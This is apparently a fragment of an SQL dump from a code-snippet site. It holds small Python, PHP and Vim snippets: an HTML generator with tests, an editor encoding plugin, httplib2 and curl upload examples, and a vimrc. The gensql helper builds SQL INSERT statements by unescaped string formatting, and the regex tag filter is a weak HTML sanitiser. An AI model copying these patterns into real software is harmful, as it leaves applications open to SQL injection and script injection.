== 0:\n                raise TypeError(\'you appear to be calling read() on a \'\n                    \'HTML instance\')\n\n        # customising a tag with content or attributes\n        escape = kw.pop(\'escape\', True)\n        if content:\n            if escape:\n                self._content = list(map(cgi.escape, content))\n            else:\n                self._content = content\n        if \'newlines\' in kw:\n            # special-case to allow control over newlines\n            self._newlines = kw.pop(\'newlines\')\n        for k in kw:\n            if k == \'klass\':\n                self._attrs[\'class\'] = cgi.escape(kw[k], True)\n            else:\n                self._attrs[k] = cgi.escape(kw[k], True)\n        return self\n\n    def __enter__(self):\n        # we\'re now adding tags to me!\n        self._stack.append(self)\n        return self\n\n    def __exit__(self, exc_type, exc_value, exc_tb):\n        # we\'re done adding tags to me!\n        self._stack.pop()\n\n    def __repr__(self):\n        return \'<HTML %s 0x%x>\' % (self._name, id(self))\n\n    def _stringify(self, str_type):\n        # turn me and my content into text\n        join = \'\\n\' if self._newlines else \'\'\n        if self._name is None:\n            return join.join(map(str_type, self._content))\n        a = [\'%s="%s"\' % i for i in self._attrs.items()]\n        l = [self._name] + a\n        s = \'<%s>%s\' % (\' \'.join(l), join)\n        if self._content:\n            s += join.join(map(str_type, self._content))\n            s += join + \'</%s>\' % self._name\n        return s\n\n    def __str__(self):\n        return self._stringify(str)\n\n    def __unicode__(self):\n        return self._stringify(unicode)\n\n    def __iter__(self):\n        return iter([str(self)])\n\n\nclass XHTML(HTML):\n    \'\'\'Easily generate XHTML.\n    \'\'\'\n    empty_elements = set(\'base meta link hr br param img area input col \\\n        colgroup basefont isindex frame\'.split())\n\n    def _stringify(self, str_type):\n        # turn me and my content into text\n        # honor empty and non-empty elements\n        join = \'\\n\' if self._newlines else \'\'\n        if self._name is None:\n            return join.join(map(str_type, self._content))\n        a = [\'%s="%s"\' % i for i in self._attrs.items()]\n        l = [self._name] + a\n        s = \'<%s>%s\' % (\' \'.join(l), join)\n        if self._content or not(self._name.lower() in self.empty_elements):\n            s += join.join(map(str_type, self._content))\n            s += join + \'</%s>\' % self._name\n        else:\n            s = \'<%s />%s\' % (\' \'.join(l), join)\n        return s\n\n\nclass XML(XHTML):\n    \'\'\'Easily generate XML.\n\n    All tags with no contents are reduced to self-terminating tags.\n    \'\'\'\n    newline_default_on = set()          # no tags are special\n\n    def _stringify(self, str_type):\n        # turn me and my content into text\n        # honor empty and non-empty elements\n        join = \'\\n\' if self._newlines else \'\'\n        if self._name is None:\n            return join.join(map(str_type, self._content))\n        a = [\'%s="%s"\' % i for i in self._attrs.items()]\n        l = [self._name] + a\n        s = \'<%s>%s\' % (\' \'.join(l), join)\n        if self._content:\n            s += join.join(map(str_type, self._content))\n            s += join + \'</%s>\' % self._name\n        else:\n            s = \'<%s />%s\' % (\' \'.join(l), join)\n        return s\n\n\nclass TestCase(unittest.TestCase):\n    def test_empty_tag(self):\n        \'generation of an empty HTML tag\'\n        self.assertEquals(str(HTML().br), \'<br>\')\n\n    def test_empty_tag_xml(self):\n        \'generation of an empty XHTML tag\'\n        self.assertEquals(str(XHTML().br), \'<br />\')\n\n    def test_tag_add(self):\n        \'test top-level tag creation\'\n        self.assertEquals(str(HTML(\'html\', \'text\')), \'<html>\\ntext\\n</html>\')\n\n    def test_tag_add_no_newline(self):\n        \'test top-level tag creation\'\n        self.assertEquals(str(HTML(\'html\', \'text\', newlines=False)),\n            \'<html>text</html>\')\n\n    def test_iadd_tag(self):\n        "test iadd\'ing a tag"\n        h = XML(\'xml\')\n        h += XML(\'some-tag\', \'spam\', newlines=False)\n        h += XML(\'text\', \'spam\', newlines=False)\n        self.assertEquals(str(h),\n            \'<xml>\\n<some-tag>spam</some-tag>\\n<text>spam</text>\\n</xml>\')\n\n    def test_iadd_text(self):\n        "test iadd\'ing text"\n        h = HTML(\'html\', newlines=False)\n        h += \'text\'\n        h += \'text\'\n        self.assertEquals(str(h), \'<html>texttext</html>\')\n\n    def test_xhtml_match_tag(self):\n        \'check forced generation of matching tag when empty\'\n        self.assertEquals(str(XHTML().p), \'<p></p>\')\n\n    if sys.version_info[0] == 2:\n        def test_empty_tag_unicode(self):\n            \'generation of an empty HTML tag\'\n            self.assertEquals(unicode(HTML().br), unicode(\'<br>\'))\n\n        def test_empty_tag_xml_unicode(self):\n            \'generation of an empty XHTML tag\'\n            self.assertEquals(unicode(XHTML().br), unicode(\'<br />\'))\n\n        def test_xhtml_match_tag_unicode(self):\n            \'check forced generation of matching tag when empty\'\n            self.assertEquals(unicode(XHTML().p), unicode(\'<p></p>\'))\n\n    def test_just_tag(self):\n        \'generate HTML for just one tag\'\n        self.assertEquals(str(HTML().br), \'<br>\')\n\n    def test_just_tag_xhtml(self):\n        \'generate XHTML for just one tag\'\n        self.assertEquals(str(XHTML().br), \'<br />\')\n\n    def test_xml(self):\n        \'generate XML\'\n        self.assertEquals(str(XML().br), \'<br />\')\n        self.assertEquals(str(XML().p), \'<p />\')\n        self.assertEquals(str(XML().br(\'text\')), \'<br>text</br>\')\n\n    def test_para_tag(self):\n        \'generation of a tag with contents\'\n        h = HTML()\n        h.p(\'hello\')\n        self.assertEquals(str(h), \'<p>hello</p>\')\n\n    def test_escape(self):\n        \'escaping of special HTML characters in text\'\n        h = HTML()\n        h.text(\'<>&\')\n        self.assertEquals(str(h), \'&lt;&gt;&amp;\')\n\n    def test_no_escape(self):\n        \'no escaping of special HTML characters in text\'\n        h = HTML()\n        h.text(\'<>&\', False)\n        self.assertEquals(str(h), \'<>&\')\n\n    def test_escape_attr(self):\n        \'escaping of special HTML characters in attributes\'\n        h = HTML()\n        h.br(id=\'<>&"\')\n        self.assertEquals(str(h), \'<br id="&lt;&gt;&amp;&quot;">\')\n\n    def test_subtag_context(self):\n        \'generation of sub-tags using "with" context\'\n        h = HTML()\n        with h.ol:\n            h.li(\'foo\')\n            h.li(\'bar\')\n        self.assertEquals(str(h), \'<ol>\\n<li>foo</li>\\n<li>bar</li>\\n</ol>\')\n\n    def test_subtag_direct(self):\n        \'generation of sub-tags directly on the parent tag\'\n        h = HTML()\n        l = h.ol\n        l.li(\'foo\')\n        l.li.b(\'bar\')\n        self.assertEquals(str(h),\n            \'<ol>\\n<li>foo</li>\\n<li><b>bar</b></li>\\n</ol>\')\n\n    def test_subtag_direct_context(self):\n        \'generation of sub-tags directly on the parent tag in "with" context\'\n        h = HTML()\n        with h.ol as l:\n            l.li(\'foo\')\n            l.li.b(\'bar\')\n        self.assertEquals(str(h),\n            \'<ol>\\n<li>foo</li>\\n<li><b>bar</b></li>\\n</ol>\')\n\n    def test_subtag_no_newlines(self):\n        \'prevent generation of newlines against default\'\n        h = HTML()\n        l = h.ol(newlines=False)\n        l.li(\'foo\')\n        l.li(\'bar\')\n        self.assertEquals(str(h), \'<ol><li>foo</li><li>bar</li></ol>\')\n\n    def test_add_text(self):\n        \'add text to a tag\'\n        h = HTML()\n        p = h.p(\'hello, world!\\n\')\n        p.text(\'more text\')\n        self.assertEquals(str(h), \'<p>hello, world!\\nmore text</p>\')\n\n    def test_add_text_newlines(self):\n        \'add text to a tag with newlines for prettiness\'\n        h = HTML()\n        p = h.p(\'hello, world!\', newlines=True)\n        p.text(\'more text\')\n        self.assertEquals(str(h), \'<p>\\nhello, world!\\nmore text\\n</p>\')\n\n    def test_doc_newlines(self):\n        \'default document adding newlines between tags\'\n        h = HTML()\n        h.br\n        h.br\n        self.assertEquals(str(h), \'<br>\\n<br>\')\n\n    def test_doc_no_newlines(self):\n        \'prevent document adding newlines between tags\'\n        h = HTML(newlines=False)\n        h.br\n        h.br\n        self.assertEquals(str(h), \'<br><br>\')\n\n    def test_unicode(self):\n        \'make sure unicode input works and results in unicode output\'\n        h = HTML(newlines=False)\n        # Python 3 compat\n        try:\n            unicode = unicode\n            TEST = \'euro \\xe2\\x82\\xac\'.decode(\'utf8\')\n        except:\n            unicode = str\n            TEST = \'euro €\'\n        h.p(TEST)\n        self.assertEquals(unicode(h), \'<p>%s</p>\' % TEST)\n\n    def test_table(self):\n        \'multiple "with" context blocks\'\n        h = HTML()\n        with h.table(border=\'1\'):\n            for i in range(2):\n                with h.tr:\n                    h.td(\'column 1\')\n                    h.td(\'column 2\')\n        self.assertEquals(str(h), \'\'\'<table border="1">\n<tr><td>column 1</td><td>column 2</td></tr>\n<tr><td>column 1</td><td>column 2</td></tr>\n</table>\'\'\')\n\nif __name__ == \'__main__\':\n    unittest.main()\n\n\n# Copyright (c) 2009 eKit.com Inc (http://www.ekit.com/)\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the "Software"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n#  The above copyright notice and this permission notice shall be included in\n#  all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\n# vim: set filetype=python ts=4 sw=4 et si\n', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'html.py', 11, 8, '2012-07-17 22:56:12', 'sublime text 2'),
	('2523578e639445329b1a90b4c0ebf8ce', 'None', ' sublime text 2的GBK支持插件改良版', 'jamiesun', 'jamiesun.net@gmail.com', 'python', '#coding: utf8\n\n\'\'\'\n@description: sublime text 2的GBK支持插件改良版\n@tags:sublime text 2\n\'\'\'\nimport os, re\nimport sublime,sublime_plugin\n\n\ndef gbk2utf8(view):\n    try:\n        reg_all = sublime.Region(0, view.size())\n        gbk = view.substr(reg_all).encode(\'gbk\')\n    except:\n        gbk = file(view.file_name()).read()\n        text = gbk.decode(\'gbk\')\n\n        tmp_file = u"%s.dump"%view.file_name()\n        f = file(tmp_file, \'w\')\n        f.write(text.encode(\'utf8\'))\n        f.close()\n\n        window = sublime.active_window()\n        \n        tmp_view = window.open_file(tmp_file)\n\n        if not tmp_view:\n            window.open_file(tmp_file)\n        \n        window.focus_view(view)\n        window.run_command(\'close\')\n        window.focus_view(tmp_view)\n        sublime.status_message(\'gbk encoding detected, open with utf8.\')\n\ndef saveWithEncoding(view, file_name = None, encoding = \'gbk\'):\n    if not file_name:\n        file_name = view.file_name()\n    reg_all = sublime.Region(0, view.size())\n    text = view.substr(reg_all).encode(encoding)\n    gbk = file(file_name, \'w\')\n    gbk.write(text)\n    gbk.close()    \n\nclass EventListener(sublime_plugin.EventListener):\n    def on_load(self, view):\n        gbk2utf8(view)\n\n    def on_post_save(self, view):\n        if ".dump" in view.file_name():\n            file_name = view.file_name()[:-5]\n            saveWithEncoding(view, file_name)\n\n    def on_close(self,view):\n        if ".dump" in view.file_name():\n            os.remove(view.file_name())\n\n\nclass SaveWithGbkCommand(sublime_plugin.TextCommand):\n    def __init__(self, view):\n        self.view = view\n    def run(self, edit):\n        file_name = self.view.file_name()\n\n        if(not file_name):\n            return\n\n        if ".dump" not in self.view.file_name():\n            saveWithEncoding(self.view)\n            sublime.active_window().run_command(\'close\')\n            sublime.active_window().open_file(self.view.file_name())\n        else:\n            sublime.active_window().run_command(\'save\')\n\nclass SaveWithUtf8Command(sublime_plugin.TextCommand):\n    def __init__(self, view):\n        self.view = view\n    def run(self, edit):\n        file_name = self.view.file_name()\n\n        if(not file_name):\n            return\n\n        if ".dump" in self.view.file_name():\n            file_name = self.view.file_name()[:-5]\n            saveWithEncoding(self.view, file_name, \'utf-8\')\n            sublime.active_window().run_command(\'close\')\n            sublime.active_window().open_file(file_name)\n        else:\n            sublime.active_window().run_command(\'save\')', 'd07d60af92a14169afc444f5d5aeb45a', 'python', 'sublime_gbk.py', 55, 6, '2012-07-12 09:19:48', 'sublime text 2'),
	('2be005ac11964a1fb656d0ee4685dcd5', 'None', 'python httplib2 Example', 'pyer', 'jamiesun@talkincode.org', 'python,httplib2', '##@tags:httplib2,pythn\n\n########################## 一般用法\n\nimport httplib2\nh = httplib2.Http(".cache")\nresp, content = h.request("http://example.org/", "GET")\n\n# content就是请求获取的内容，已经进行了解压处理，resp对象包含了所有的header信息\n\n##########################  SSL and Basic authentication:\n\nimport httplib2\nh = httplib2.Http(".cache")\nh.add_credentials(\'name\', \'password\')\nresp, content = h.request("https://example.org/chap/2", \n    "PUT", body="This is text", \n    headers={\'content-type\':\'text/plain\'} )\n\n##########################  缓存控制\n\nimport httplib2\nh = httplib2.Http(".cache")\nresp, content = h.request("http://bitworking.org/")\n\nresp, content = h.request("http://bitworking.org/", \n    headers={\'cache-control\':\'no-cache\'})\n\n# 第一个请求将被缓存\n\n########################## 提交表单数据\n\nfrom httplib2 import Http\nfrom urllib import urlencode\nh = Http()\ndata = dict(name="Joe", comment="A test comment")\nresp, content = h.request("http://bitworking.org/news/223/Meet-Ares", "POST", urlencode(data))\n# resp\n# {\'status\': \'200\', \'transfer-encoding\': \'chunked\', \'vary\': \'Accept-Encoding,User-Agent\',\n#  \'server\': \'Apache\', \'connection\': \'close\', \'date\': \'Tue, 31 Jul 2007 15:29:52 GMT\', \n#  \'content-type\': \'text/html\'}\n\n########################## Cookie处理\n\n#!/usr/bin/env python\nimport urllib\nimport httplib2\n\nhttp = httplib2.Http()\n\nurl = \'http://www.example.com/login\'   \nbody = {\'USERNAME\': \'foo\', \'PASSWORD\': \'bar\'}\nheaders = {\'Content-type\': \'application/x-www-form-urlencoded\'}\nresponse, content = http.request(url, \'POST\', headers=headers, body=urllib.urlencode(body))\n\nheaders = {\'Cookie\': response[\'set-cookie\']}\n\nurl = \'http://www.example.com/home\'   \nresponse, content = http.request(url, \'GET\', headers=headers)     \n\n\n########################## 代理设置\n\nimport httplib2\nimport socks\n\nhttplib2.debuglevel=4\nh = httplib2.Http(proxy_info = httplib2.ProxyInfo(socks.PROXY_TYPE_HTTP, \'localhost\', 8000))\nr,c = h.request("http://bitworking.org/news/") ', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'httplib2_example.py', 31, 6, '2012-07-14 12:43:53', 'sublime text 2'),
	('2c505790a59c4323a52a385935e21df7', '0', 'python操作剪贴板', 'Anonymous', 'Anonymous@talkincode.org', 'other', 'import win32clipboard as w\r\nimport win32con\r\n\r\ndef getText():\r\n    w.OpenClipboard()\r\n    d = w.GetClipboardData(win32con.CF_TEXT)\r\n    w.CloseClipboard()\r\n    return d\r\n\r\ndef setText(aString):\r\n    w.OpenClipboard()\r\n    w.EmptyClipboard()\r\n    w.SetClipboardData(win32con.CF_TEXT, aString)\r\n    w.CloseClipboard()', NULL, 'python', NULL, 19, 9, '2012-07-17 23:42:31', NULL),
	('30dfcce55a5644dea56967f308e09653', 'None', '使用python将dict生成sql', 'piaoren', 'jamiesun@talkincode.org', 'python,sql,database', '#coding:utf-8\ndef gensql(table,dicts):\n    with open("%s.table.sql"%table,\'w\') as buff:\n        for sqlobj in dicts:\n            ks,vs = \'\',\'\'\n            for k,v in sqlobj.items():\n                ks += \'%s,\'%k\n                vs += \'\\\'%s\\\',\'%v\n            sql = "insert into %s (%s) values(%s);"%(table,ks[:-1],vs[:-1])\n            print >> buff,sql\n\nif __name__ == "__main__":\n    datas = dict(username="demo",password="demo",email="demo@demo.com")\n    gensql("user",(datas,))', '4e84ce1b8a5247bb8a6179959438b55f', 'python', 'gensql.py', 34, 8, '2012-07-23 12:42:43', 'sublime text 2'),
	('35c8f5fd2a454319a80b3a0956e581bc', '0', 'python过滤html标签', 'Anonymous', 'Anonymous@talkincode.org', 'html', 'def filter_tags(htmlstr):\r\n    """\r\n    ##过滤HTML中的标签\r\n    #将HTML中标签等信息去掉\r\n    #@param htmlstr HTML字符串."""\r\n    #先过滤CDATA\r\n    re_cdata=re.compile(\'//<!\\[CDATA\\[[^>]*//\\]\\]>\',re.I) #匹配CDATA\r\n    re_script=re.compile(\'<\\s*script[^>]*>[^<]*<\\s*/\\s*script\\s*>\',re.I)#Script\r\n    re_style=re.compile(\'<\\s*style[^>]*>[^<]*<\\s*/\\s*style\\s*>\',re.I)#style\r\n    re_br=re.compile(\'<br\\s*?/?>\')#处理换行\r\n    re_h=re.compile(\'</?\\w+[^>]*>\')#HTML标签\r\n    re_comment=re.compile(\'<!--[^>]*-->\')#HTML注释\r\n    s=re_cdata.sub(\'\',htmlstr)#去掉CDATA\r\n    s=re_script.sub(\'\',s) #去掉SCRIPT\r\n    s=re_style.sub(\'\',s)#去掉style\r\n    s=re_br.sub(\'\\n\',s)#将br转换为换行\r\n    s=re_h.sub(\'\',s) #去掉HTML 标签\r\n    s=re_comment.sub(\'\',s)#去掉HTML注释\r\n    #去掉多余的空行\r\n    blank_line=re.compile(\'\\n+\')\r\n    s=blank_line.sub(\'\\n\',s)\r\n    s=replaceCharEntity(s)#替换实体\r\n    return s\r\n\r\n\r\ndef replaceCharEntity(htmlstr):\r\n    """\r\n    ##替换常用HTML字符实体.\r\n    #使用正常的字符替换HTML中特殊的字符实体.\r\n    #你可以添加新的实体字符到CHAR_ENTITIES中,处理更多HTML字符实体.\r\n    #@param htmlstr HTML字符串.\r\n    """\r\n    CHAR_ENTITIES={\'nbsp\':\' \',\'160\':\' \',\r\n                \'lt\':\'<\',\'60\':\'<\',\r\n                \'gt\':\'>\',\'62\':\'>\',\r\n                \'amp\':\'&\',\'38\':\'&\',\r\n                \'quot\':\'"\',\'34\':\'"\',}\r\n    \r\n    re_charEntity=re.compile(r\'&#?(?P<name>\\w+);\')\r\n    sz=re_charEntity.search(htmlstr)\r\n    while sz:\r\n        entity=sz.group()#entity全称，如>\r\n        key=sz.group(\'name\')#去除&;后entity,如>为gt\r\n        try:\r\n            htmlstr=re_charEntity.sub(CHAR_ENTITIES[key],htmlstr,1)\r\n            sz=re_charEntity.search(htmlstr)\r\n        except KeyError:\r\n            #以空串代替\r\n            htmlstr=re_charEntity.sub(\'\',htmlstr,1)\r\n            sz=re_charEntity.search(htmlstr)\r\n    return htmlstr', NULL, 'python', NULL, 11, 8, '2012-07-17 22:51:04', NULL),
	('3b1834f159554ba48c8685e857ceed62', '0', '使用curl上传', 'Anonymous', 'Anonymous@talkincode.org', 'curl', '<?\r\n//Set no time limit (in case of big uploads)\r\nset_time_limit(0);\r\n\r\n//Include your viddler API wrapper\r\ninclude \'/path/to/your/viddler/library\';\r\n\r\n/**\r\n1. Create viddler object\r\n2. Authenticate as you\r\n3. Set session id\r\n**/\r\n$v            = new Viddler_V2(\'YOUR API KEY\');\r\n$auth         = $v->viddler_users_auth(array(\'user\'=>\'YOUR USERNAME\',\'password\'=>\'YOUR PASSWORD\'));\r\n$session_id   = (isset($auth[\'auth\'][\'sessionid\'])) ? $auth[\'auth\'][\'sessionid\'] : NULL;\r\n\r\n/**\r\nIf session id is empty, something went wrong.\r\nYou probably want to handle the error better,\r\nbut this is for example purposes only.\r\n**/\r\nif (empty($session_id)) {\r\n  print \'<pre>\';\r\n  print_r($auth);\r\n  print \'</pre>\';\r\n  exit;\r\n}\r\n\r\n/**\r\n1. Call prepareUpload\r\n2. Get endpoint\r\n3. Get token\r\n**/\r\n$response = $v->viddler_videos_prepareUpload(array(\'sessionid\' => $session_id));\r\n$endpoint = (isset($response[\'upload\'][\'endpoint\'])) ? $response[\'upload\'][\'endpoint\'] : NULL;\r\n$token    = (isset($response[\'upload\'][\'token\'])) ? $response[\'upload\'][\'token\'] : NULL;\r\n\r\n/**\r\nCheck for endpoint and token.\r\nAs in above, you will want to handle\r\nthis error better.\r\n**/\r\nif (empty($endpoint) || empty($token)) {\r\n  print \'<pre>\';\r\n  print_r($response);\r\n  print \'</pre>\';\r\n  exit;\r\n}\r\n\r\n/**\r\nSet your direct upload form variables.\r\nPHP 5.2.0+ requires these to be in array format.\r\nDocumentation: http://php.net/manual/en/function.curl-setopt.php (Search for \'CURLOPT_POSTFIELDS\')\r\n\r\nPlease keep variables in this order. \r\n\r\nAlso notice the \'@\' sign in front of the file.\r\nThis is required by curl to know it\'s binary.\r\nAfter the @ sign should be the path to the file.\r\nThis example has the file in the same directory\r\nas the example. If in a different directory I would\r\nsuggest using the full path.\r\n\r\nIE: @/var/www/vhosts/yoursite.com/tmp/test.mov\r\n**/\r\n$query          =   array(\r\n  \'uploadtoken\' =>  $token,\r\n  \'title\'       =>  \'Direct 2 Step\',\r\n  \'description\' =>  \'This is a test for uploading from server to server.\',\r\n  \'tags\'        =>  \'testing,upload\',\r\n  \'file\'        =>  \'@test.mov\'\r\n);\r\n\r\n/**\r\nStart up curl\r\n\r\nExample below tells curl to:\r\n1. return the result rather than print to screen\r\n2. follow any redirects\r\n3. return the headers\r\n4. return the body\r\n5. have no timeout\r\n6. use POST method\r\n7. set POSTFIELDS\r\n**/\r\n$ch = curl_init();\r\ncurl_setopt($ch, CURLOPT_URL, $endpoint);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);\r\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);\r\ncurl_setopt($ch, CURLOPT_HEADER, TRUE);\r\ncurl_setopt($ch, CURLOPT_NOBODY, FALSE);\r\ncurl_setopt($ch, CURLOPT_TIMEOUT, 0);\r\ncurl_setopt($ch, CURLOPT_POST, TRUE);\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS, $query);\r\n$response     = curl_exec($ch);\r\n$info         = curl_getinfo($ch);\r\n$header_size  = $info[\'header_size\'];\r\n$header       = substr($response, 0, $header_size);\r\n$video        = unserialize(substr($response, $header_size));\r\ncurl_close($ch);\r\n\r\n/**\r\nYou can easily check for errors in the upload\r\n\r\n1. If no video.id is found, print errors\r\n    - Again, you will want to log this, not just print errors out :)\r\n    \r\n2. Else print video info\r\n    - Again, you will not want to print this out but more than likely log it\r\n**/\r\nif (! isset($video[\'video\'][\'id\'])) {\r\n  print \'Error Code: \' . $video[\'error\'][\'code\'] . \'<br />\';\r\n  print \'Error Description: \' . $video[\'error\'][\'description\'] . \'<br />\';\r\n  print \'Error Details: \' . $video[\'error\'][\'details\'] . \'<br /><br />\';\r\n}\r\nelse {\r\n  print \'Video ID: \' . $video[\'video\'][\'id\'] . \'<br />\';\r\n  print \'Video Title: \' . $video[\'video\'][\'title\'] . \'<br />\';\r\n  print \'Video Description: \' . $video[\'video\'][\'description\'] . \'<br />\';\r\n  print \'Video URL: \' . $video[\'video\'][\'url\'] . \'<br />\';\r\n  print \'Video Thumbnail: \' . $video[\'video\'][\'thumbnail_url\'] . \'<br /><br />\';\r\n}\r\n\r\n\r\n/**\r\nExample print outs. Again you want to handle these better\r\nbut they are for example purposes only.\r\n\r\n1. All curl info returned\r\n    - This is handy info, tells you connection times, header sizes,\r\n      body size, http codes, etc. Handy to debug\r\n    \r\n2. Print out of the headers returned\r\n    - Again this is handy to debug with, do with it what you want\r\n    \r\n3. Print out of the video info returned\r\n    - This will be the result form the API in serialized PHP format (if using PHP as response type)\r\n      If successful, it will return the video id, title, description, url and thumbnail_url in a video object\r\n        IE: video.id, video.title, video.description, video.url, video.thumbnail_url\r\n**/\r\nprint \'<pre>\';\r\nprint_r($info);\r\nprint_r($header);\r\nprint_r($video);\r\nprint \'</pre>\';', NULL, 'php', NULL, 8, 7, '2012-07-17 22:33:35', NULL),
	('3f8c249dc4a245cab51e37a79e1b6ff3', 'None', '判断unicode码是否为中文字符', 'jamiesun', 'jamiesun.net@gmail.com', 'python', '#code:utf-8\ndef is_cn_char(i):\n    return 0x4e00<=ord(i)<0x9fa6\n \ndef is_cn_or_en(i):\n    o = ord(i)\n    return o<128 or 0x4e00<=o<0x9fa6\n', 'd07d60af92a14169afc444f5d5aeb45a', 'python', 'isch.py', 28, 8, '2012-07-12 12:10:28', 'sublime text 2'),
	('44def9aa87254bd7836abdfff3c06825', 'None', 'vim配置文件', 'pyer', 'jamiesun@talkincode.org', 'md,vim', '"@tags:vim\nset nocompatible   \nset backspace=2   \nsource $VIMRUNTIME/vimrc_example.vim   \nif has(\'win32\')   \nsource $VIMRUNTIME/mswin.vim   \nbehave mswin   \nendif   \nset encoding=utf-8   \nset fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,euc-jp,euc-kr,latin1  \nset fileencoding=utf-8 " 新建文件使用的编码   \n" set makeprg=python -u %   \n" 解决菜单乱码   \nset langmenu=zh_CN   \nlet $LANG = \'zh_CN.UTF-8\'   \nsource $VIMRUNTIME/delmenu.vim   \nsource $VIMRUNTIME/menu.vim   \n \n" 自动补全命令时候使用菜单式匹配列表   \nset wildmenu   \n" 允许退格键删除   \nset backspace=2    \n" 启用鼠标   \nset mouse=a   \n" 文件类型   \nfiletype on   \nfiletype plugin on   \nfiletype indent on   \nset ai "自动对齐   \nset sw=4 "设置Tab宽度   \nset sm "sm会在你敲},]或)显示出对应匹配的{,[或(来   \nset nobackup "不备份   \nset tabstop=4 "tab->空格   \nset expandtab   \nset linespace=2   \nset ve=all   \n"set tw=140   \nset autochdir   \nset ignorecase smartcase   \nset number   \nset cindent   \nset smartindent   \ncolo koehler   \nlet g:winManagerWindowLayout = "FileExplorer"   \nlet Tlist_Use_Right_Window=1   \nlet g:pydiction_location = \'vimfiles/ftplugin/complete-dict\'   \nlet g:pydiction_menu_height = 20   \nlet g:miniBufExplMapWindowNavVim = 1   \nlet g:miniBufExplMapWindowNavArrows = 1   \nlet g:miniBufExplMapCTabSwitchBufs = 1   \nlet g:miniBufExplModSelTarget = 1   \n\n"python配置   \nautocmd BufRead *.py set makeprg=python\\ -c\\ \\"import\\ py_compile,sys;\\ sys.stderr=sys.stdout;\\ py_compile.compile(r\'%\')\\"   \nautocmd BufRead *.py set efm=%C\\ %.%#,%A\\ \\ File\\ \\"%f\\"\\\\,\\ line\\ %l%.%#,%Z%[%^\\ ]%\\\\@=%m   \nautocmd BufRead *.py nmap <F9> :!python %<CR>   \nautocmd BufRead *.py nmap <F6> :make<CR>   \n"autocmd BufRead *.py copen "如果是py文件，则同时打开编译信息窗口   \n"map <F2> <Esc>:BufExplorer<cr>   \nmap <F3> :browse confirm e<CR>   \nmap <F4> <Esc>:tabnew<cr>   \nmap <F5> <Esc>:tabclose<cr>   \nmap <F6> :call RunScala()<CR>   \n"浏览标签   \nnnoremap <silent> <F7> :Tlist<CR>   \n"浏览文件   \nnnoremap <silent> <F8> :WMToggle<CR>   \n"map <F9> :call CompileRunJava()<CR>    \nmap <C-lt> : bn<CR>   \nmap <C-gt> : bp<CR>   \nmap <F12> :!ctags -R --c++-kinds=+p --fields=+iaS --extra=+q * <CR>   \n \n" File Explorer   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    \nlet g:explVertical=1 " should I split verticially   \nlet g:explWinSize=20 " width of 35 pixels   \n \n" Win Manager   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    \nlet g:winManagerWidth=20 " How wide should it be( pixels)   \n"let g:winManagerWindowLayout = \'FileExplorer,TagsExplorer|BufExplorer\' " What windows should it   \n" CTags   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""     \nlet Tlist_Ctags_Cmd = \'ctags\' " Location of ctags   \nlet Tlist_Sort_Type = "name" " order by    \nlet Tlist_Use_Right_Window = 1 " split to the right side of the screen   \nlet Tlist_Compart_Format = 1 " show small meny   \nlet Tlist_Exist_OnlyWindow = 1 " if you are the last, kill yourself   \nlet Tlist_File_Fold_Auto_Close = 0 " Do not close tags for other files   \nlet Tlist_Enable_Fold_Column = 0 " Do not show folding tree    \nlet g:ctags_path=\'ctags\'    \nlet g:ctags_statusline=1    \n" Minibuf   \n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    \nlet g:miniBufExplTabWrap = 1 " make tabs show complete (no broken on two lines)   \nlet g:miniBufExplModSelTarget = 1   \n  \n\nfunc! CompileRunGcc()   \nexec "w"   \nexec "!gcc % -o %<"   \nexec "! ./%<"    \nendfunc   \n \nfunc! CompileRunJava()   \nexec "w"   \nexec "!javac % "   \nexec "!java %<"   \nendfunc   \nfunc! RunScala()  \nexec "w"   \nexec "!scala % "   \nendfunc   \nset diffexpr=MyDiff()   \nfunction MyDiff()   \nlet opt = \'-a --binary \'   \nif &diffopt =~ \'icase\' | let opt = opt . \'-i \' | endif   \nif &diffopt =~ \'iwhite\' | let opt = opt . \'-b \' | endif   \nlet arg1 = v:fname_in    \nif arg1 =~ \' \' | let arg1 = \'"\' . arg1 . \'"\' | endif   \nlet arg2 = v:fname_new   \nif arg2 =~ \' \' | let arg2 = \'"\' . arg2 . \'"\' | endif   \nlet arg3 = v:fname_out    \nif arg3 =~ \' \' | let arg3 = \'"\' . arg3 . \'"\' | endif   \nlet eq = \'\'   \nif $VIMRUNTIME =~ \' \'   \nif &sh =~ \'\\<cmd\'\nlet cmd = \'""\' . $VIMRUNTIME . \'\\diff"\'   \nlet eq = \'"\'   \nelse    \nlet cmd = substitute($VIMRUNTIME, \' \', \'" \', \'\') . \'\\diff"\'    \nendif   \nelse   \nlet cmd = $VIMRUNTIME . \'\\diff\'    \nendif  \nendfunction   \n', '4e84ce1b8a5247bb8a6179959438b55f', 'md', 'vimrc.md', 15, 7, '2012-07-14 00:37:07', 'sublime text 2'),
